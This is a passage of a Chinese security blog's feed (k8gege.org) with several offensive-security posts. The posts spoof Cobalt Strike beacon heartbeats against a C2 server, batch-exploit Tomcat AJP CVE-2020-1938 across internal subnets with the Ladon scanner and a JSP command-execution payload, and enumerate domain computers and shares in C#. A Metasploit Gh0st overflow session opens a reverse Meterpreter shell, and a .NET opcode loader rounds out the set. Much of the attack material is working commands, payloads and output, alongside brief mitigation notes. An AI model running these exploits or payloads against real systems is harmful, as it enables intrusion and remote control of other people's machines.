class="string">'Qk1UsVjTNpW6aR0327yD57Zkt1m6XWurvM+bR0xqOqGnXsatzGHpnccfgqmruH6dnJudEzijQhC0NCtoAxdA90rso7NAfBrfRrktO5B4FjZX6LEBxIyzEwQ71Jk1ttM8VY6luE5k+PMLk6DAmWUoGoJmvAl/qp4qreuWumv52TM='</span>))</span><br><span class="line">res = opener.open(<span class="string">"http://192.168.1.102:800/dpixel"</span>)</span><br><span class="line">content = res.read()</span><br><span class="line"><span class="keyword">print</span> content</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:    </span><br><span class="line">print(time.strftime(<span class="string">'%Y-%m-%d %X'</span>,time.localtime()))    </span><br><span class="line">cscheat()</span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p><img alt="img" data-original="http://k8gege.org/k8img/csonline/cscheat4.gif"></p><h3 id="读取CMD指令"><a href="#读取CMD指令" class="headerlink" title="读取CMD指令"></a>读取CMD指令</h3><p>当客户端下达CMD命令时，中转TeamServer会将命令放在心跳包中，返回的结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">^Zd........N...&amp;....%COMSPEC%.... /C net user k8gege..AAAAAAAAAA.&lt;....g..I9.....</span><br><span class="line"></span><br><span class="line">5e5a69740000002e0000004e000000260000000925434f4d535045432500000013202f43206e6574</span><br><span class="line">2075736572206b387465616d00004141414141414141414100e488fc2a22f737b0067ac4384c4971</span><br></pre></td></tr></table></figure><p>测试多次发现不管执行多长的命令 都会出现/C空格 和两个00加至少一个A<br>所以我们截取 2F4320 和 000041 之间的值，再解密即为CS下发的CMD命令</p><p><img alt="img" data-original="http://k8gege.org/k8img/csonline/cscheat5.PNG"></p><h3 id="返回CMD结果"><a href="#返回CMD结果" class="headerlink" title="返回CMD结果"></a>返回CMD结果</h3><p>将CS的命令执行结果提交到submit.php页面，即可实现回显,数据包如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /submit.php?id=60871 HTTP/1.1</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)</span><br><span class="line">Host: 192.168.1.102:800</span><br><span class="line">Content-Length: 68</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"></span><br><span class="line">...@...</span><br><span class="line">........win-60a3b595b7m\k8gege</span><br><span class="line">................0=W1..LGCN..</span><br></pre></td></tr></table></figure><h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>通过本文我们了解了CS心跳包机制、下达指令、回显等原理，并玩弄入侵者<br>有兴趣的话，可以自行抓包实现自己的CS服务端，甚至支持对Linux的控制<br>也可以实现CS远控的密罐，把CS下达的指令提取出来，返回假的CMD命令结果<br>即能收集目标证据以及意图，还能将他玩弄于鼓掌之中，搞死他，哈哈</p><p>PS：之所以有这篇文章，是因为昨晚有人在群里讨论，CS能不能支不支持Linux<br>目前CS的shellcode以及beacon(核心功能DLL)都是WINDOWS系统才能执行。<br>而CS对于Linux的控制目前仅是SSH会话，想真正支持就得自己实现服务端<br>不要说让其支持Linux，用个GO来实现，兼容全平台都可以，只是很麻烦<br>因为不开源，每一个动作都要自己去分析它的数据包，很多功能也很费时<br>其实早在去年的这个时间就想实现Linux服务端，所以抓包研究了下。<br>当时就应该有这篇文章了，只是因为忙，懒得编辑文字，后面忘了发。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;不知道你有没有遇到过马上线却不能操作的情况，我猜当你网络卡或马写得不好时会出现这个问题&lt;br&gt;但是人为的你可能没遇到过，首先要欺骗你的远控，
      
    
    </summary>
    
    
      <category term="Cobalt Strike" scheme="http://k8gege.org/categories/Cobalt-Strike/"/>
    
      <category term="Python" scheme="http://k8gege.org/categories/Cobalt-Strike/Python/"/>
    
      <category term="编程" scheme="http://k8gege.org/categories/Cobalt-Strike/Python/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="源码" scheme="http://k8gege.org/categories/Cobalt-Strike/Python/%E7%BC%96%E7%A8%8B/%E6%BA%90%E7%A0%81/"/>
    
    
      <category term="Cobalt Strike" scheme="http://k8gege.org/tags/Cobalt-Strike/"/>
    
      <category term="Python" scheme="http://k8gege.org/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Ladon CVE-2020-1938跨网段、C段批量扫描内网漏洞</title>
    <link href="http://k8gege.org/p/42879.html"/>
    <id>http://k8gege.org/p/42879.html</id>
    <published>2020-03-28T03:39:45.663Z</published>
    <updated>2020-02-29T15:03:27.661Z</updated>
    
    <content type="html"><![CDATA[<h3 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><p>根据国家信息安全漏洞共享平台（CNVD）20日发布的Apache Tomcat文件包含漏洞（CNVD-2020-10487/CVE-2020-1938）。该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。</p><h3 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h3><p>cnvd-2020-10487<br>cve-2020-1938</p><h3 id="漏洞条件"><a href="#漏洞条件" class="headerlink" title="漏洞条件"></a>漏洞条件</h3><p>开放AJP端口（默认开放8009）</p><h3 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h3><p>apache tomcat 6<br>apache tomcat 7 &lt; 7.0.100<br>apache tomcat 8 &lt; 8.5.51<br>apache tomcat 9 &lt; 9.0.31</p><h3 id="扫描框架"><a href="#扫描框架" class="headerlink" title="扫描框架"></a>扫描框架</h3><p>Ladon设计的初衷就是一个多线程扫描框架，主要是为了让使用者能快速批量检测企业内部或外部站点漏洞<br>不管你擅长哪一门语言，只需要实现单一功能，都可以快速进行批量IP、批量URL、批量C段、批量B段等等<br>每当公开或泄露一个新漏洞时，自己要实现多现程以及批量以上功能，重写一份浪费时间，可能会错过时机<br>小内网可能自己写个批量IP.TXT就够用了，但是大的内网几百几千个网段就基本没有工具考虑，如批量C段<br>但是不要慌，无论是多线程，还是批量C段、跨网段等等，Ladon全都帮你考虑好了，只需实现单一功能即可<br>在Ladon的插件中配置INI方式是不需要具备编程能力的，只要会使用工具，即可实现批量调用，非常简单</p><h3 id="Ladon配置"><a href="#Ladon配置" class="headerlink" title="Ladon配置"></a>Ladon配置</h3><p>INI配置很简单，只需要两个参数即可。Github上随便找一份EXP，以下我用的是PYTHON版。<br>两种配置方式，一种是编译成EXE丢到目标上运行的，一种是PY脚本方式执行方便本地调式</p><h4 id="EXE配置"><a href="#EXE配置" class="headerlink" title="EXE配置"></a>EXE配置</h4><p>cve-2020-1938.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line">exe=CVE-2020-1938.exe</span><br><span class="line">arg=-p 8009 -f /WEB-INF/web.xml <span class="variable">$ip</span>$ -c 0</span><br></pre></td></tr></table></figure><h4 id="PY配置"><a href="#PY配置" class="headerlink" title="PY配置"></a>PY配置</h4><p>cve-2020-1938.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line">exe=f:\python\python.exe</span><br><span class="line">arg=CVE-2020-1938.py -p 8009 -f /WEB-INF/web.xml <span class="variable">$ip</span>$ -c 0</span><br></pre></td></tr></table></figure><h3 id="批量内网"><a href="#批量内网" class="headerlink" title="批量内网"></a>批量内网</h3><p>把开放8009端口的IP放进ip.txt，执行以下命令即可批量扫描<br>当然也可以不扫端口和不扫存活IP，直接ip24.txt扫描批量C段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon cve-2020-1938.ini</span><br></pre></td></tr></table></figure><p>以下为内网实战批量检测结果<br><img alt="img" data-original="http://k8gege.org/k8img/Ladon/exp/CVE-2020-1938.png"></p><h3 id="文件包含RCE"><a href="#文件包含RCE" class="headerlink" title="文件包含RCE"></a>文件包含RCE</h3><p>一定条件下可实现RCE，如有地方实现文件上传，往目标传个exec.jpg,内容如下，执行whoami</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%out.println(<span class="keyword">new</span> java.io.BufferedReader(<span class="keyword">new</span> java.io.InputStreamReader(Runtime.getRuntime().exec(<span class="string">"whoami"</span>).getInputStream())).readLine());%&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python CVE-2020-1938.py -p 8009 -f exec.jpg 192.168.1.10 -c 1</span><br><span class="line">Getting resource at ajp13://192.168.1.10:8009/index.jsp</span><br><span class="line">----------------------------</span><br><span class="line">k82003-77562e10\administrator</span><br></pre></td></tr></table></figure><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h4 id="1-更新到安全版本"><a href="#1-更新到安全版本" class="headerlink" title="1.更新到安全版本"></a>1.更新到安全版本</h4><p>Apache Tomcat 7.0.100<br>Apache Tomcat 8.5.51<br>Apache Tomcat 9.0.31</p><h4 id="2-关闭AJP服务"><a href="#2-关闭AJP服务" class="headerlink" title="2.关闭AJP服务"></a>2.关闭AJP服务</h4><p>修改Tomcat配置文件Service.xml,注释掉<br><connector port="8009" protocol="AJP/1.3" redirectport="8443"></connector></p><h4 id="3、配置ajp配置"><a href="#3、配置ajp配置" class="headerlink" title="3、配置ajp配置"></a>3、配置ajp配置</h4><p>配置ajp配置中的secretRequired跟secret属性来限制认证</p><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h3&gt;&lt;p&gt;根据国家信息安全漏洞共享平台（CNVD）20日发布的Apache Tomcat文件包含漏洞（CNVD-2020-10487/
      
    
    </summary>
    
    
      <category term="内网" scheme="http://k8gege.org/categories/%E5%86%85%E7%BD%91/"/>
    
      <category term="Ladon" scheme="http://k8gege.org/categories/%E5%86%85%E7%BD%91/Ladon/"/>
    
      <category term="Exp" scheme="http://k8gege.org/categories/%E5%86%85%E7%BD%91/Ladon/Exp/"/>
    
      <category term="编程" scheme="http://k8gege.org/categories/%E5%86%85%E7%BD%91/Ladon/Exp/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="源码" scheme="http://k8gege.org/categories/%E5%86%85%E7%BD%91/Ladon/Exp/%E7%BC%96%E7%A8%8B/%E6%BA%90%E7%A0%81/"/>
    
    
      <category term="Exp" scheme="http://k8gege.org/tags/Exp/"/>
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
  </entry>
  
  <entry>
    <title>利用DirectoryEntry获取域内计算机以及共享资源</title>
    <link href="http://k8gege.org/p/54132.html"/>
    <id>http://k8gege.org/p/54132.html</id>
    <published>2020-03-28T03:39:45.663Z</published>
    <updated>2020-01-18T11:51:28.162Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>System.DirectoryServices.DirectoryEntry组件提供了对Active Directory的访问。本文以两个简单的小程序为例，阐述了如何利用此组件查看网络的各节点的信息。 DirectoryEntry组件提供了Path属性，根据文档，此属性指定了目录服务中用来访问对象的对象名，其格式如下：<br>protocol://servername:port number/distinguished name<br>此语句的第一部分定义了访问将使用的协议，如<br>LDAP: (Lightweight Directory Access Protocol)<br>IIS: (提供IIS元数据来读及配置Internet Infomation Server)<br>WinNT: (提供在非常有限的性能下对Windows NT域的访问)<br>NDS: (提供对Novell Directory Service的访问)<br>等等（详细信息清参考MSDN）。 </p><p>因此我们构造一个DirectoryEntry实例，将它的Path设为”WinNT:”，以通过对它的所有子项的枚举来发现网络上的所有域（以及工作组）。这样，再对所发现的域（以及工作组）的子项进行枚举，就可以发现网络上的所有计算机，结合WMI发现机器上的共享资源。</p><h3 id="C-实现代码"><a href="#C-实现代码" class="headerlink" title="C#实现代码"></a>C#实现代码</h3><p>以下为Ladon的EnumShare代码,自动获取当前域，并枚举域内计算机以及获取机器开放共享资源。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">string strDomain;</span><br><span class="line">string strComputer;</span><br><span class="line">string strShare;</span><br><span class="line">Console.WriteLine(&quot;Load EnumShare&quot;);</span><br><span class="line"></span><br><span class="line">DirectoryEntry root &#x3D; new DirectoryEntry(&quot;WinNT:&quot;);</span><br><span class="line">foreach (DirectoryEntry Domain in root.Children)</span><br><span class="line">&#123;</span><br><span class="line">    strDomain &#x3D; Domain.Name;</span><br><span class="line">    Console.WriteLine(&quot;Domain: &quot; + strDomain);</span><br><span class="line">    foreach (DirectoryEntry Computer in Domain.Children)</span><br><span class="line">    &#123;</span><br><span class="line">        if (Computer.SchemaClassName.Equals(&quot;Computer&quot;))</span><br><span class="line">        &#123;</span><br><span class="line">            strComputer &#x3D; Computer.Name;</span><br><span class="line">            ManagementObjectSearcher searcher &#x3D; new ManagementObjectSearcher(&quot;select * from win32_share&quot;);</span><br><span class="line">            foreach (ManagementObject share in searcher.Get())</span><br><span class="line">            &#123;</span><br><span class="line">                strShare &#x3D; share[&quot;Name&quot;].ToString();</span><br><span class="line">                Console.WriteLine(strComputer + &quot;\\&quot; + strShare);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Ladon EnumShare<br>因为崇尚极简主义，所以Ladon无需填写域名以及参数，参数多也很烦，全自动获取，一步到位。<br><img alt="img" data-original="https://k8gege.org/k8img/Ladon/exe/EnumShare.PNG"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p><p><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.directoryservices.directoryentry?view=netframework-4.8" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/api/system.directoryservices.directoryentry?view=netframework-4.8</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;System.DirectoryServices.DirectoryEntry组件提供了对Active Directory的访问。本文以两个
      
    
    </summary>
    
    
      <category term="内网" scheme="http://k8gege.org/categories/%E5%86%85%E7%BD%91/"/>
    
      <category term=".NET" scheme="http://k8gege.org/categories/NET/"/>
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
      <category term="编程" scheme="http://k8gege.org/categories/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="源码" scheme="http://k8gege.org/categories/%E6%BA%90%E7%A0%81/"/>
    
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
      <category term=".NET" scheme="http://k8gege.org/tags/NET/"/>
    
  </entry>
  
  <entry>
    <title>利用Gh0st 3.6远程溢出漏洞反向控制攻击者</title>
    <link href="http://k8gege.org/p/30568.html"/>
    <id>http://k8gege.org/p/30568.html</id>
    <published>2020-01-12T10:30:10.000Z</published>
    <updated>2020-01-12T11:52:45.803Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>漏洞验证在2017年被公开，实际上Gh0st溢出漏洞在2009年时就已被人爆出过多个<br>可见使用开源C2工具，不见得安全，最好是经过二次修改，单纯做免杀可防不了哦</p><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>Teston WinXP at 2017-09-15<br>运行Gh0st客户端，然后通过MSF溢出C2客户端机器，即可反向获取攻击者机器权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/misc/gh0st</span><br><span class="line">msf exploit(gh0st) &gt; <span class="built_in">set</span> RHOST 192.168.1.126</span><br><span class="line">RHOST =&gt; 192.168.1.126</span><br><span class="line">msf exploit(gh0st) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.125:4444 </span><br><span class="line">[*] 192.168.1.126:80 - Trying target Gh0st Beta 3.6</span><br><span class="line">[*] 192.168.1.126:80 - Spraying heap...</span><br><span class="line">[*] 192.168.1.126:80 - Trying <span class="built_in">command</span> 103...</span><br><span class="line">[*] Sending stage (957999 bytes) to 192.168.1.126</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.1.125:4444 -&gt; 192.168.1.126:1070) at 2017-09-15 16:22:56 +0800</span><br><span class="line">[*] 192.168.1.126:80 - Server closed connection</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : K8ANTI-B2B9B81C</span><br><span class="line">OS              : Windows XP (Build 2600, Service Pack 3).</span><br><span class="line">Architecture    : x86</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : WORKGROUP</span><br><span class="line">Logged On Users : 2</span><br><span class="line">Meterpreter     : x86/windows</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p><a href="https://github.com/rapid7/metasploit-framework/blob/be66ed8af3c355b1280e1a2bdbe5dd1a74e7bc58/modules/exploits/windows/misc/gh0st.rb" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/blob/be66ed8af3c355b1280e1a2bdbe5dd1a74e7bc58/modules/exploits/windows/misc/gh0st.rb</a></p><p><a href="https://github.com/rapid7/metasploit-framework/files/1243297/0efd83a87d2f5359fae051517fdf4eed8972883507fbd3b5145c3757f085d14c.zip" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/files/1243297/0efd83a87d2f5359fae051517fdf4eed8972883507fbd3b5145c3757f085d14c.zip</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;漏洞验证在2017年被公开，实际上Gh0st溢出漏洞在2009年时就已被人爆出过多个&lt;br&gt;可见使用开源C2工具，不见得安全，最好是经过二次
      
    
    </summary>
    
    
      <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
    
      <category term="Metasploit" scheme="http://k8gege.org/categories/Metasploit/"/>
    
    
      <category term="Metasploit" scheme="http://k8gege.org/tags/Metasploit/"/>
    
      <category term="Overflow" scheme="http://k8gege.org/tags/Overflow/"/>
    
      <category term="Gh0st" scheme="http://k8gege.org/tags/Gh0st/"/>
    
  </entry>
  
  <entry>
    <title>.NET版“ShellCode”编写</title>
    <link href="http://k8gege.org/p/40249.html"/>
    <id>http://k8gege.org/p/40249.html</id>
    <published>2020-01-11T07:10:10.000Z</published>
    <updated>2020-01-18T11:48:26.936Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x000-前言"><a href="#0x000-前言" class="headerlink" title="0x000 前言"></a>0x000 前言</h3><p>近几年大家都喜欢用CS来进行后渗透，所以对于ShellCode大家应该不会陌生。<br>但是可能很多人并不懂CS它的功能是什么,CS生成的ShellCode是一段下载者。<br>主要功能为下载becon.dll，然后内存加载，我们所用的相关功能都在becon里。<br>ShellCode可能采用汇编或VC编写后转成机器码提取关键机器码，优势在于体积小<br>体积小就可以直接结合漏洞使用，什么Word文档、MS17010溢出、IE漏洞挂马等<br>都可以直接结合CS来使用，直接CS上线，而不是非要先做其它操作再植入CS。<br>网上关于汇编或VC编写ShellCode的文章很多，但是.NET的”ShellCode”很少见<br>本文将教大家如何用操作码实现.NET版”ShellCode”的编写。</p><h3 id="0x001-指令、操作码、字节码"><a href="#0x001-指令、操作码、字节码" class="headerlink" title="0x001 指令、操作码、字节码"></a>0x001 指令、操作码、字节码</h3><p>在正式开始前，先给大家科普一下指令、操作码、机器码等的区别</p><p>指令: 命令cpu干什么,是由操作码字段和地址码字段(操作数字段)组成</p><p>操作码(Opcode): 就是执行某种操作的命令代码</p><p>BYTECODE(字节码）：与机器代码相同,除了它主要由基于软件的解释器(如Java或CLR)使用</p><p>程序集：有两个“程序集” – 一个汇编程序是一系列的助记符和操作数,它们被馈送到“汇编程序”,<br>“汇编程序”将助记符和操作数“汇编成可执行的机器代码”.可选地,“链接器”链接组件并生成可执行文件.</p><p>CLR语言：(.NET语言)中的第二个“程序集”是一系列CLR代码,其中注入了元数据信息,可执行代码库,但不能直接执行.</p><h3 id="0x002-Payload-ShellCode"><a href="#0x002-Payload-ShellCode" class="headerlink" title="0x002 Payload ShellCode"></a>0x002 Payload ShellCode</h3><p>机器码(溢出常用的ShellCode): 就是指令的二进制代码(包括操作码和地址码)，功能打开和关闭计算机中的开关的数字序列,以执行某些工作 – 例如增加数字,分支,乘法等等.这是纯机器特有的,由处理器的实现者.</p><p>K8理解的ShellCode是子弹，用枪发射(好比处理器执行); 无论你用的是哪种子弹(ShellCode)，都是用枪来射(处理器执行)。</p><p>Payload: K8的理解是弹药，弹药可装填到弹壳里用，也可直接点然，也可圈起来当成炮仗点燃，但是弹药不能直接被枪发射。</p><p>PS：发现很多搞安全的对很多概念搞混，如很多文章常把payload和shellcode混为一谈<br>看了以上释义，您应该了解明显shellcode只是payload中的一种了，不可能属于同一个。<br>很多人把操作码误解为ShellCode还可以理解，起码长得像还有点类似，但真不是。<br>不要看到二进制、16进制或者byte数组就说是shellcode，长得像人都不定是人呢。</p><h3 id="0x003-NET函数代码"><a href="#0x003-NET函数代码" class="headerlink" title="0x003 .NET函数代码"></a>0x003 .NET函数代码</h3><p>.NET包含多种语言，这里我使用C#的代码做为例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public int Add(int x, int y)</span><br><span class="line">&#123;</span><br><span class="line">    x &#x3D; x * y;</span><br><span class="line">    return x  + y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x003-反汇编得到IL指令"><a href="#0x003-反汇编得到IL指令" class="headerlink" title="0x003 反汇编得到IL指令"></a>0x003 反汇编得到IL指令</h3><p>指令速查表：<a href="https://www.jb51.net/article/86802.htm" target="_blank" rel="noopener">https://www.jb51.net/article/86802.htm</a><br>IL语言，可理解为.NET的汇编,无论你使用的是C#还是VB.NET或者F#开发功能，都可以将其反编译成IL代码。使用ildasm.exe工具反编译，可以看到IL代码和汇编差不多，可能是常用.NET吧，感觉比汇编简单好多。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  &#x2F;&#x2F; Method begins at RVA 0x2170</span><br><span class="line">  &#x2F;&#x2F; Code size       9 (0x9)</span><br><span class="line">  .maxstack  8</span><br><span class="line">  IL_0000:  &#x2F;* 03   |                  *&#x2F; ldarg.1</span><br><span class="line">  IL_0001:  &#x2F;* 04   |                  *&#x2F; ldarg.2</span><br><span class="line">  IL_0002:  &#x2F;* 5A   |                  *&#x2F; mul</span><br><span class="line">  IL_0003:  &#x2F;* 10   | 01               *&#x2F; starg.s    x</span><br><span class="line">  IL_0005:  &#x2F;* 03   |                  *&#x2F; ldarg.1</span><br><span class="line">  IL_0006:  &#x2F;* 04   |                  *&#x2F; ldarg.2</span><br><span class="line">  IL_0007:  &#x2F;* 58   |                  *&#x2F; add</span><br><span class="line">  IL_0008:  &#x2F;* 2A   |                  *&#x2F; ret</span><br><span class="line">&#125; &#x2F;&#x2F; end of method MethodBodyDemo::Add</span><br></pre></td></tr></table></figure><h3 id="0x004-IL指令转-NET操作码"><a href="#0x004-IL指令转-NET操作码" class="headerlink" title="0x004 IL指令转.NET操作码"></a>0x004 IL指令转.NET操作码</h3><p>如同VC反汇编提取机器码一样，我们将对应16进制复制出来，然后再对比指令速查表提取关键操作码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x02,0x03,0x5A,0x10,0x00,0x02,0x03,0x58,0x2A</span><br></pre></td></tr></table></figure><h3 id="0x005-操作码加载"><a href="#0x005-操作码加载" class="headerlink" title="0x005 操作码加载"></a>0x005 操作码加载</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">private static Func&lt;int, int, int&gt; LoadByteAssmbly(byte[] bytes)</span><br><span class="line">    &#123;</span><br><span class="line">        var asmName &#x3D; new AssemblyName(&quot;DynamicAssembly&quot;);</span><br><span class="line">        var asmBuilder &#x3D; AppDomain.CurrentDomain.DefineDynamicAssembly(asmName, AssemblyBuilderAccess.RunAndSave);</span><br><span class="line">        var module &#x3D; asmBuilder.DefineDynamicModule(&quot;DynamicModule&quot;);</span><br><span class="line">        var typeBuilder &#x3D; module.DefineType(&quot;DynamicType&quot;);</span><br><span class="line">        var method &#x3D; typeBuilder.DefineMethod(&quot;DynamicMethod&quot;,</span><br><span class="line">            MethodAttributes.Public | MethodAttributes.Static,</span><br><span class="line">            typeof(int),</span><br><span class="line">            new[] &#123; typeof(int), typeof(int) &#125;);</span><br><span class="line">        method.CreateMethodBody(bytes, bytes.Length);</span><br><span class="line">        var type &#x3D; typeBuilder.CreateType();</span><br><span class="line"></span><br><span class="line">        return (Func&lt;int, int, int&gt;)type.GetMethod(&quot;DynamicMethod&quot;).CreateDelegate(typeof(Func&lt;int, int, int&gt;));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="0x006-执行效果"><a href="#0x006-执行效果" class="headerlink" title="0x006 执行效果"></a>0x006 执行效果</h3><p><img alt="image" data-original="http://k8gege.org/k8img/Other/ilcode.PNG"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x000-前言&quot;&gt;&lt;a href=&quot;#0x000-前言&quot; class=&quot;headerlink&quot; title=&quot;0x000 前言&quot;&gt;&lt;/a&gt;0x000 前言&lt;/h3&gt;&lt;p&gt;近几年大家都喜欢用CS来进行后渗透，所以对于ShellCode大家应该不会陌生。&lt;br&gt;但是
      
    
    </summary>
    
    
      <category term=".NET" scheme="http://k8gege.org/categories/NET/"/>
    
      <category term="ShellCode" scheme="http://k8gege.org/categories/ShellCode/"/>
    
      <category term="编程" scheme="http://k8gege.org/categories/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="源码" scheme="http://k8gege.org/categories/%E6%BA%90%E7%A0%81/"/>
    
    
      <category term=".NET" scheme="http://k8gege.org/tags/NET/"/>
    
      <category term="ShellCode" scheme="http://k8gege.org/tags/ShellCode/"/>
    
